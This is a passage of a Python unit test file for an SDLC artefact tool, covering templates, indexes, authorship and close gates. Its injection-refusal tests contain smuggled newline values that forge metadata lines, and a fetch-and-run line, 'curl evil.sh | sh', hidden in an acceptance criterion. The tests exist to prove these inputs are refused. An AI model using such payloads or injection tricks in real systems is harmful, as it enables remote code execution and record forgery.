             "## Fix (proposed)\n\n{{fix}}\n\n## Verify\n\n{{verify}}\n")

    def _repo(self, d, declare=True, write_template=True):
        repo = Path(d)
        _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
        (repo / "sdlc-studio" / "templates").mkdir(parents=True)
        if write_template:
            (repo / "sdlc-studio" / "templates" / "bug.md").write_text(
                self.HOUSE, encoding="utf-8")
        if declare:
            (repo / "sdlc-studio" / ".config.yaml").write_text(
                "conventions:\n  templates:\n    bug: sdlc-studio/templates/bug.md\n",
                encoding="utf-8")
        return repo

    def _yaml(self):
        try:
            import yaml  # noqa: F401
        except ImportError:
            self.skipTest("PyYAML absent - conventions degrade to defaults")

    def test_declared_template_shapes_the_scaffold(self) -> None:
        self._yaml()
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r = artifact.new(repo, "bug", "wrong colour", dict(GROOM))
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("**Created-by:** sdlc-studio new", text)  # provenance head intact
            self.assertIn("## Symptom", text)                        # house body grafted
            self.assertIn("## Fix (proposed)", text)
            self.assertNotIn("## Steps to Reproduce", text)          # skill body replaced

    def test_undeclared_project_uses_skill_default(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d, declare=False)
            r = artifact.new(repo, "bug", "wrong colour", dict(GROOM))
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("## Steps to Reproduce", text)             # v3.4.0 behaviour

    def test_declared_but_missing_template_fails_loud(self) -> None:
        self._yaml()
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d, write_template=False)
            from lib import conventions
            with self.assertRaises(conventions.ConventionsError):
                artifact.new(repo, "bug", "wrong colour", dict(GROOM))


class MetaTypeTests(unittest.TestCase):
    """CR0143: retro and review are tool-created (id + file + index row), the last
    hand-authored artifact class retired."""

    def test_new_retro_creates_file_and_index_row(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            rd = root / "sdlc-studio" / "retros"
            rd.mkdir(parents=True)
            (rd / "_index.md").write_text(
                "# Retro Index\n\n| ID | Sprint | Date | Delivered | Blocked |\n"
                "| --- | --- | --- | --- | --- |\n", encoding="utf-8")
            res = artifact.meta_new(root, "retro", "Sprint close retro")
            self.assertTrue(res["id"].startswith("RETRO-"))
            body = Path(res["path"]).read_text(encoding="utf-8")
            self.assertIn("Sprint close retro", body)
            self.assertNotIn("{{retro_id}}", body)           # id/title/date filled
            idx = (rd / "_index.md").read_text(encoding="utf-8")
            self.assertIn(res["id"], idx)
            self.assertTrue(res["indexed"])

    def test_new_review_without_index_bootstraps_and_indexes(self) -> None:
        # BG0116: a review created before any index used to report indexed=False and leave a
        # missing-index reconcile drift item. meta_new now bootstraps the index on first use,
        # so the file is created AND indexed.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
            res = artifact.meta_new(root, "review", "Adversarial code review")
            self.assertTrue(res["id"].startswith("RV-"))
            self.assertTrue(res["indexed"])                  # index bootstrapped on first use
            self.assertTrue(Path(res["path"]).exists())

    def test_review_stamps_raised_by_and_the_rev_row_name_from_author(self) -> None:
        # BG0175: the review scaffold path used to drop --author - no Raised-by line and a
        # literal {{author}} in the revision row. It must now stamp Raised-by and write the
        # resolved name, like every other type.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
            res = artifact.meta_new(root, "review", "Closing review",
                                    {"author": "Darren Benson; human; v1"})
            text = Path(res["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Darren Benson; human; v1", text)
            self.assertNotIn("{{author}}", text)
            self.assertIn("| Darren Benson | Created via `new` (deterministic) |", text)

    def test_meta_new_takes_allocation_lock(self) -> None:
        # BG0126: meta_new used to allocate + index-append unguarded, so two concurrent
        # retro/review creates could mint the same sequential id and clobber the index.
        # Prove the lock is now entered around the create (fails against the pre-fix code).
        import contextlib
        entered = []
        real_lock = sdlc_md.allocation_lock

        @contextlib.contextmanager
        def _spy(root, *a, **k):
            entered.append(root)
            with real_lock(root, *a, **k):
                yield

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)
            orig = sdlc_md.allocation_lock
            sdlc_md.allocation_lock = _spy
            try:
                artifact.meta_new(root, "retro", "Locked retro")
            finally:
                sdlc_md.allocation_lock = orig
        self.assertTrue(entered, "meta_new must take sdlc_md.allocation_lock")

    def test_meta_row_lands_in_the_data_table_not_a_later_one(self) -> None:
        # critic finding: a later link-first table must not attract the new row
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            rd = root / "sdlc-studio" / "retros"; rd.mkdir(parents=True)
            (rd / "_index.md").write_text(
                "# Retro Index\n\n| ID | Sprint | Date | Delivered | Blocked |\n"
                "| --- | --- | --- | --- | --- |\n"
                "| [RETRO-0001](RETRO0001-a.md) | A | d | 1/1 | 0 |\n\n"
                "## Related\n\n| Doc | Note |\n| --- | --- |\n"
                "| [LESSONS](x.md) | summary |\n", encoding="utf-8")
            res = artifact.meta_new(root, "retro", "New retro")
            idx = (rd / "_index.md").read_text(encoding="utf-8").splitlines()
            stem = Path(res["path"]).name          # unique slug, never the bare id
            row_i = next(i for i, l in enumerate(idx) if stem in l)
            related_i = next(i for i, l in enumerate(idx) if l.startswith("## Related"))
            self.assertLess(row_i, related_i)   # inside the data table, not below Related

    def test_cli_new_accepts_retro_type(self) -> None:
        import io
        from contextlib import redirect_stdout
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = artifact.main(["new", "--type", "retro", "--title", "t",
                                    "--root", str(root)])
            self.assertEqual(rc, 0)

    def test_first_retro_bootstraps_index_zero_drift(self) -> None:
        # BG0116: init makes the retros/ dir but no _index.md, so the FIRST retro used to
        # land as a missing-index reconcile drift item. meta_new now bootstraps the index
        # (mirroring the handoff path) so the first retro is indexed, not drift.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)   # dir only, no index
            self.assertFalse((root / "sdlc-studio" / "retros" / "_index.md").exists())
            res = artifact.meta_new(root, "retro", "First retro")
            self.assertTrue((root / "sdlc-studio" / "retros" / "_index.md").exists())
            self.assertTrue(res["indexed"])
            drift = reconcile.meta_index_drift(root)
            self.assertEqual(drift, [], f"first retro should leave 0 meta drift, got {drift}")

    def test_first_review_bootstraps_index_zero_drift(self) -> None:
        # BG0116: the same bootstrap covers reviews/.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
            res = artifact.meta_new(root, "review", "First review")
            self.assertTrue(res["indexed"])
            self.assertEqual(reconcile.meta_index_drift(root), [])


class RevisionVerbTests(unittest.TestCase):
    """`artifact.py revision`: deterministic batch appends to Revision History -
    the sprint-close mechanical task that used to be hand-scripted."""

    def _repo(self, d):
        repo = Path(d)
        dd = repo / "sdlc-studio" / "change-requests"; dd.mkdir(parents=True)
        for i in (1, 2):
            (dd / f"CR000{i}-thing-{i}.md").write_text(
                f"# CR-000{i}: thing {i}\n\n> **Status:** Proposed\n\n"
                "## Revision History\n\n| Date | Author | Change |\n"
                "| --- | --- | --- |\n| 2026-07-01 | sdlc | Created |\n",
                encoding="utf-8")
        (dd / "CR0003-no-table.md").write_text(
            "# CR-0003: no table\n\n> **Status:** Proposed\n", encoding="utf-8")
        return repo

    def test_batch_appends_one_dated_row_each(self):
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            rc = artifact.main(["revision", "--ids", "CR0001,CR0002",
                                "--note", "Delivered in tranche X",
                                "--author", "close-out", "--root", str(repo)])
            self.assertEqual(rc, 0)
            for slug in ("CR0001-thing-1.md", "CR0002-thing-2.md"):
                text = (repo / "sdlc-studio" / "change-requests" / slug).read_text(
                    encoding="utf-8")
                rows = [ln for ln in text.splitlines()
                        if "Delivered in tranche X" in ln]
                self.assertEqual(len(rows), 1, slug)
                self.assertIn("close-out", rows[0])
                self.assertTrue(rows[0].startswith("| 20"), rows[0])  # dated

    def test_missing_section_refused_loudly(self):
        import contextlib, io
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main(["revision", "--ids", "CR0001,CR0003",
                                    "--note", "n", "--root", str(repo)])
            self.assertNotEqual(rc, 0)                    # any refusal -> non-zero
            self.assertIn("CR0003", err.getvalue())       # refused id named
            text = (repo / "sdlc-studio" / "change-requests" /
                    "CR0001-thing-1.md").read_text(encoding="utf-8")
            self.assertIn("| n |", text)                   # the good id still landed

    def test_unknown_id_refused(self):
        import contextlib, io
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main(["revision", "--ids", "CR0099",
                                    "--note", "n", "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            self.assertIn("CR0099", err.getvalue())


class CloseUlidTests(unittest.TestCase):
    def test_close_infers_type_from_a_v3_ulid_id(self) -> None:
        # BG0072: the close cascade must type the ids the v3 era mints.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            _v3(repo)
            r = artifact.new(repo, "bug", "ulid close probe", dict(GROOM))
            self.assertTrue(sdlc_md.is_v3_id(r["id"]), r["id"])
            # Since BG0214 the preview runs the real gate ladder, so the bug close needs what a
            # real one needs: a recorded verification depth and a structured triaging seat.
            import transition  # noqa: PLC0415 - local, as the sibling scripts are imported here
            transition.annotate(repo, r["id"], "Verification depth", "functional")
            _tick_criteria(repo, r["id"])
            res = artifact.close(repo, r["id"], dry_run=True,
                                 triaged_by="Tester; agent; v1")
            self.assertEqual(res["type"], "bug")

    def test_close_still_infers_v2_and_dashed_v2_ids(self) -> None:
        for rid, expected in (("BG0007", "bug"), ("CR-0003", "cr"), ("US0001", "story")):
            got = artifact.infer_type_from_id(rid)
            self.assertEqual(got, expected, rid)


import io
from contextlib import redirect_stdout


class ConsolidationCliTests(unittest.TestCase):
    """The Low-consolidation lane must exit 0 in text mode - a false non-zero after a landed
    CR invites orchestrator retries and duplicate findings."""

    def _v3_cr_ready(self, repo: Path) -> None:
        _v3(repo)
        _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")

    def test_low_consolidation_dry_run_exits_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d); self._v3_cr_ready(repo)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = artifact.main(["new", "--type", "bug", "--title", "low probe",
                                    "--severity", "Low", *GROOM_CLI,
                                    "--root", str(repo), "--dry-run"])
            self.assertEqual(rc, 0, buf.getvalue())
            self.assertIn("consolidate", buf.getvalue())

    def test_low_consolidation_create_and_append_exit_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d); self._v3_cr_ready(repo)
            for i, expect_created in ((1, "created=True"), (2, "created=False")):
                buf = io.StringIO()
                with redirect_stdout(buf):
                    rc = artifact.main(["new", "--type", "bug", "--title", f"low probe {i}",
                                        "--severity", "Low", *GROOM_CLI, "--root", str(repo)])
                self.assertEqual(rc, 0, buf.getvalue())
                self.assertIn("consolidated into CR", buf.getvalue())
                self.assertIn(expect_created, buf.getvalue())


import json as _json


class ProvenanceStampTests(unittest.TestCase):
    """BG0095: the trust boundary needs a WRITER - artifact new --provenance external stamps
    the field the verify_ac shell gate reads."""

    def test_new_with_provenance_external_stamps_the_field(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "from an issue", {**GROOM_REQUEST, "provenance": "external"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Provenance:** external", body)
            self.assertEqual(sdlc_md.extract_field(body, "Provenance"), "external")

    def test_default_new_carries_no_provenance_field(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "home grown", dict(GROOM_REQUEST))
            self.assertNotIn("**Provenance:**", Path(r["path"]).read_text(encoding="utf-8"))

    def test_externally_stamped_story_blocks_shell_verifiers(self) -> None:
        # end-to-end with the enforcement point: verify_ac must refuse shell on the stamp.
        import io
        from contextlib import redirect_stderr
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "ingested", {"epic": "EP0001",
                                                         "provenance": "external"})
            p = Path(r["path"])
            p.write_text(p.read_text(encoding="utf-8").replace(
                "- **Verify:** {{executable check}}", "- **Verify:** shell echo pwned"),
                encoding="utf-8")
            import verify_ac
            err = io.StringIO()
            with redirect_stderr(err):
                results = verify_ac.verify_story(p, dry_run=False, timeout=10,
                                                 repo_root=repo, allow_shell=True)
            blob = _json.dumps(results, default=str) + err.getvalue()
            self.assertIn("external", blob.lower())
            self.assertNotIn('"status": "pass"', blob.lower())



class OrchestratedCloseTests(unittest.TestCase):
    """CR0209/US0116 AC3: one close call = depth stamp + critic verdict + terminal transition."""

    def test_orchestrated_close_stamps_records_and_closes(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "orchestrated close probe", {**GROOM, "severity": "Medium"})
            _tick_criteria(repo, r["id"])   # the close ladder needs an oracle to read
            rc = artifact.main(["close", "--id", r["id"],
                                "--depth", "functional (probe suite green)",
                                "--verdict", "APPROVE",
                                "--reviewer", "Sam (QA)", "--author", "Author (build)",
                                "--root", str(repo)])
            self.assertEqual(rc, 0)
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Verification depth:** functional (probe suite green)", body)
            self.assertIn("> **Status:** Fixed", body)
            verdicts = (repo / "sdlc-studio" / "reviews" / "critic-verdicts.md")
            self.assertTrue(verdicts.exists())
            self.assertIn(r["id"], verdicts.read_text(encoding="utf-8"))

    def test_orchestrated_close_refuses_self_review(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "self review probe", {**GROOM, "severity": "Medium"})
            # Captured, not printed: this call REFUSES by design, so its refusal was one of
            # the diagnostics the test-noise budget counted. Asserted on instead, which makes
            # the message part of the contract rather than a side effect scrolling past.
            import contextlib as _ctx
            import io as _io
            buf = _io.StringIO()
            with _ctx.redirect_stdout(buf), _ctx.redirect_stderr(buf):
                rc = artifact.main(["close", "--id", r["id"],
                                    "--depth", "functional", "--verdict", "APPROVE",
                                    "--reviewer", "Same One", "--author", "Same One",
                                    "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            self.assertIn("independence is the floor", buf.getvalue())
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Status:** Open", body)  # nothing transitioned




class RevisionAuthorTests(unittest.TestCase):
    """The Revision History Author cell carries the resolved authorship of record - a name,
    never a hardcoded literal and never the typed triple."""

    @staticmethod
    def _rev_row(body: str) -> str:
        lines = body.splitlines()
        head = next(i for i, ln in enumerate(lines)
                    if ln.strip().startswith("## Revision History"))
        return [ln for ln in lines[head:] if ln.strip().startswith("|")][2]

    def test_named_author_reaches_the_revision_history(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "authored", {**GROOM_REQUEST, "author": "Dani Okafor"})
            self.assertIn("| Dani Okafor |",
                          self._rev_row(Path(r["path"]).read_text(encoding="utf-8")))

    def test_typed_author_triple_renders_the_name_only(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "authored", {**GROOM_REQUEST, "author": "Claude (Fable 5); agent; v5"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Claude (Fable 5); agent; v5", body)
            row = self._rev_row(body)
            self.assertIn("| Claude (Fable 5) |", row)
            self.assertNotIn(";", row)

    def test_unattributed_new_names_the_invoking_agent(self) -> None:
        import os
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            prev = os.environ.get("SDLC_AUTHOR")
            os.environ["SDLC_AUTHOR"] = "Sprint Driver; agent; v1"
            try:
                r = artifact.new(repo, "cr", "unattributed", dict(GROOM_REQUEST))
            finally:
                os.environ.pop("SDLC_AUTHOR")
                if prev is not None:
                    os.environ["SDLC_AUTHOR"] = prev
            row = self._rev_row(Path(r["path"]).read_text(encoding="utf-8"))
            self.assertIn("| Sprint Driver |", row)  # not the literal 'sdlc'


RFC_HEADER = "| ID | Title | Priority | Status | Author | Date | Spawned CRs |"


class IndexAuthorColumnTests(unittest.TestCase):
    """The index Author column takes the same resolved NAME as the Revision History row -
    `artifact new` and the finding filer are two creators writing one column."""

    @staticmethod
    def _row(repo: Path) -> str:
        text = (repo / "sdlc-studio" / "rfcs" / "_index.md").read_text(encoding="utf-8")
        return next(ln for ln in text.splitlines() if ln.strip().startswith("| [RFC"))

    def test_typed_triple_is_not_dumped_into_the_index_cell(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            artifact.new(repo, "rfc", "a design", {"author": "Claude (Fable 5); agent; v5"})
            row = self._row(repo)
            self.assertIn("| Claude (Fable 5) |", row)
            self.assertNotIn("agent; v5", row)

    def test_unattributed_index_cell_names_the_invoking_agent(self) -> None:
        import os
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            prev = os.environ.get("SDLC_AUTHOR")
            os.environ["SDLC_AUTHOR"] = "Sprint Driver; agent; v1"
            try:
                artifact.new(repo, "rfc", "a design")
            finally:
                os.environ.pop("SDLC_AUTHOR")
                if prev is not None:
                    os.environ["SDLC_AUTHOR"] = prev
            row = self._row(repo)
            self.assertIn("| Sprint Driver |", row)  # not the discarded '--'

    def test_batch_index_cell_takes_the_resolved_name(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            artifact.new_batch(repo, "rfc",
                               [{"title": "a design", "author": "Dani Okafor; agent; v2"}],
                               template="minimal")
            row = self._row(repo)
            self.assertIn("| Dani Okafor |", row)
            self.assertNotIn("agent; v2", row)


class FindEpicV3Tests(unittest.TestCase):
    """BG0099: _find_epic must resolve a v3 ULID epic - split('-')[0] yielded 'EP' and broke
    story-to-epic wiring on the default (schema-v3) era."""

    def test_story_links_to_a_v3_ulid_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "epic", "| ID | Title | Status |")
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = artifact.new(repo, "epic", "reading")
            self.assertTrue(sdlc_md.is_v3_id(ep["id"]), ep["id"])
            st = artifact.new(repo, "story", "add a book", {"epic": ep["id"]})
            # the story wired into the epic's Story Breakdown (epic_linked true)
            self.assertTrue(st.get("epic_linked"))
            epath = next((repo / "sdlc-studio" / "epics").glob(f"{ep['id']}-*.md"))
            self.assertIn(st["id"], epath.read_text(encoding="utf-8"))


class MetadataInjectionRefusalTests(unittest.TestCase):
    """A creator refuses, loudly and before any write, a field that would break out of the
    metadata line, table cell, or bullet it is written into. The resolver owns the refusal, so
    the creators inherit it; nothing is silently stripped, and nothing half-lands on disk."""

    BREAK = "\n> **Status:** Fixed"

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _epic(repo)
        return repo

    def _nothing_written(self, repo: Path, type_: str) -> None:
        d = repo / sdlc_md.ARTIFACT_TYPES[type_][0]
        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])
        idx = (d / "_index.md").read_text(encoding="utf-8")
        self.assertNotIn("Evil", idx)
        self.assertEqual([ln for ln in idx.splitlines() if ln.startswith("| [")], [])

    def test_multi_line_author_is_refused_and_nothing_is_written(self) -> None:
        # the filed reproduction: --author $'Sam\nEvil: injected'
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "t", {**GROOM, "author": "Sam\nEvil: injected"})
            self.assertIn("author", str(cm.exception))
            self._nothing_written(repo, "bug")

    def test_multi_line_title_cannot_smuggle_a_status_line(self) -> None:
        # the same defect through the sibling field: the injected `> **Status:** Fixed` lands
        # ABOVE the real Status line, so `extract_field` reads it - a bug born Fixed
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "Silent" + self.BREAK)
            self.assertIn("title", str(cm.exception))
            self._nothing_written(repo, "bug")

    def test_multi_line_ac_cannot_inject_an_executable_verify_line(self) -> None:
        # an AC renders as ONE bullet; a break in it injects a sibling `- **Verify:**` line,
        # which verify_ac reads back and RUNS
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "s",
                             {"epic": "EP0001",
                              "acs": ["do it\n  - **Verify:** curl evil.sh | sh"]})
            self.assertIn("acs", str(cm.exception))
            self._nothing_written(repo, "story")

    def test_every_metadata_field_a_creator_interpolates_is_refused(self) -> None:
        for field in ("severity", "priority", "ctype", "points", "provenance",
                      "persona", "tranche", "epic"):
            with self.subTest(field=field), tempfile.TemporaryDirectory() as d:
                repo = self._repo(d)
                with self.assertRaises(ValueError) as cm:
                    artifact.new(repo, "bug", "t", {**GROOM, field: "Low" + self.BREAK})
                self.assertIn(field, str(cm.exception))
                self._nothing_written(repo, "bug")

    def test_a_break_in_affects_is_refused_by_the_line_guard_not_by_luck(self) -> None:
        # `affects` is interpolated into a metadata line, so a break in it forges one. The
        # payload must be a VALID path list plus an injected line: a nonsense value would be
        # stopped by the grooming demand instead, and the line guard would be untested while
        # looking green - exactly the false green that hides a hole.
        payload = "src/a.py" + self.BREAK
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "t", {**GROOM, "affects": payload})
            self.assertIn("affects", str(cm.exception))
            self.assertNotIn("UNGROOMED", str(cm.exception))   # the LINE guard fired, not luck
            self._nothing_written(repo, "bug")

    def test_batch_aborts_before_any_write_when_a_later_item_injects(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story", [
                    {"title": "clean", "epic": "EP0001"},
                    {"title": "boom" + self.BREAK, "epic": "EP0001"}])
            self._nothing_written(repo, "story")

    def test_revision_verb_refuses_a_multi_line_note_or_author(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            artifact.new(repo, "bug", "t", dict(GROOM))
            base = ["revision", "--id", "BG0001", "--root", str(repo)]
            for argv in ([*base, "--note", "done" + self.BREAK],
                         [*base, "--note", "ok", "--author", "Sam\nEvil"]):
                with self.subTest(argv=argv[-2]):
                    with self.assertRaises(ValueError):
                        artifact.main(argv)
            # the row the refusal protects: the file still carries only its opening row
            bug = next((repo / "sdlc-studio" / "bugs").glob("BG0001-*.md"))
            self.assertNotIn("Evil", bug.read_text(encoding="utf-8"))

    def test_a_clean_artefact_still_creates(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r = artifact.new(repo, "bug", "a real defect",
                             {**GROOM, "author": "Dani Okafor; agent; v2", "severity": "High"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Dani Okafor; agent; v2", body)
            self.assertTrue(r["indexed"])


class LeadingBreakBypassTests(unittest.TestCase):
    """The value that is WRITTEN must be the value that was CHECKED. The front guard once
    stripped before checking, but the persona / acs / options / title writers emit the RAW
    value - so a payload whose only break was LEADING passed the guard (strip discarded it)
    and injected a forged line. A leading break is refused like any other, on `new` AND
    `batch`, and the injected line never reaches disk or the verifier."""

    LEAD = "\n> **Forged-field:** INJECTED"
    RCE_AC = "\n  - **Verify:** shell echo pwned"

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
        _epic(repo)
        return repo

    def _no_story_written(self, repo: Path) -> None:
        d = repo / "sdlc-studio" / "stories"
        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])

    def test_leading_break_persona_is_refused_on_new(self) -> None:
        # (a) the reproduced persona forgery: strip discarded the leading break, the raw
        # writer emitted `> **Persona:**` then the forged line
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "victim",
                             {"epic": "EP0001", "persona": self.LEAD})
            self.assertIn("persona", str(cm.exception))
            self._no_story_written(repo)

    def test_leading_break_ac_is_refused_on_new(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "v",
                             {"epic": "EP0001", "acs": [self.RCE_AC]})
            self.assertIn("acs", str(cm.exception))
            self._no_story_written(repo)

    def test_leading_break_option_is_refused_on_new(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            _index(repo, "rfc", "| ID | Title | Status | Date |")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "rfc", "r", {"options": ["ok", self.LEAD]})
            self.assertIn("options", str(cm.exception))

    def test_leading_break_persona_and_ac_are_refused_on_batch(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story",
                                   [{"title": "v", "epic": "EP0001", "persona": self.LEAD}])
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story",
                                   [{"title": "v", "epic": "EP0001", "acs": [self.RCE_AC]}])
            self._no_story_written(repo)

    def test_leading_break_title_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "\n> **Forged:** x", {"epic": "EP0001"})
            self.assertIn("title", str(cm.exception))
            self._no_story_written(repo)

    def test_refused_ac_never_lets_verify_ac_execute_the_injected_shell(self) -> None:
        # end-to-end: the exact RCE the Summary promotes to must-fix. A refused --ac must
        # leave no story on disk, so verify_ac never sees the injected `shell` verifier and
        # the marker file it would have run is never created.
        import verify_ac
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            marker = repo / "PWNED"
            payload = f"\n  - **Verify:** shell touch {marker}"
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "v", {"epic": "EP0001", "acs": [payload]})
            self._no_story_written(repo)
            # belt and braces: had a story slipped through, this is what would have run it
            for p in (repo / "sdlc-studio" / "stories").glob("*.md"):
                if p.name != "_index.md":
                    for block in verify_ac.parse_story(p.read_text(encoding="utf-8")):
                        self.assertNotIn("touch", block.verifier or "")
            self.assertFalse(marker.exists(), "injected shell verifier executed - RCE open")


class GroomingDemandTests(unittest.TestCase):
    """BG0136: `artifact new` is a DOCUMENTED create path for a bug and a CR, so it answers to
    the same grooming demand as the finding filer - from the same authority (the planner's own
    `breakdown` predicate). A creator that let an ungroomed unit through would simply be where
    the bug moved to.

    Behaviour only: every assertion here creates (or fails to create) a real artefact and reads
    the result, or asks the PLANNER what it makes of what was written.
    """

    def _bugs(self, repo: Path) -> list[Path]:
        d = repo / "sdlc-studio" / "bugs"
        return [p for p in d.glob("*.md") if p.name != "_index.md"] if d.exists() else []

    def _plan_verdict(self, repo: Path, path: Path, type_: str) -> dict:
        spec = importlib.util.spec_from_file_location(
            "sprint", Path(__file__).resolve().parent.parent / "sprint.py")
        sprint = importlib.util.module_from_spec(spec)
        sys.modules["sprint"] = sprint
        spec.loader.exec_module(sprint)
        return sprint.breakdown(repo, [{"id": path.stem.split("-")[0], "type": type_,
                                        "path": str(path)}], skip_personas=True)

    def test_new_bug_without_grooming_is_refused_and_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "the parser drops a dash", {"severity": "High"})
            self.assertIn("--affects", str(cm.exception))
            self.assertEqual(self._bugs(repo), [])

    def test_batch_aborts_wholly_on_one_ungroomed_item(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            with self.assertRaises(ValueError) as cm:
                artifact.new_batch(repo, "bug", [
                    {"title": "groomed", **GROOM},
                    {"title": "ungroomed", "severity": "High"},   # item 2 sinks the batch
                ])
            self.assertIn("item 2", str(cm.exception))
            self.assertEqual(self._bugs(repo), [], "a partial batch reached disk")

    def test_a_created_bug_is_plannable_on_its_footprint(self) -> None:
        # The round trip through the OTHER creator: created here, and the planner accepts its
